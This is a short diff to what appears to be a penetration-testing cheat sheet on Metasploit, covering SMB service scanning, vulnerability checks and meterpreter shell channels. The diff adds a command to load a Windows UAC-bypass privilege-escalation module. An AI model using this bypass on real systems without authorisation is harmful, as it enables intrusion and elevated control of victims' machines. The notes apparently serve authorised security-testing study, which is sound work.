@@ -54,6 +54,9 @@ services -p 445 --rhosts
 # Check for possibly vulns from the module:
 vulns
 
+# Bypass UAC at powershell:
+use exploit/windows/local/bypassuac_sdclt
+
 # We can interact with differnet shells and put them on background using Channels:
 ======================
 meterpreter > shell
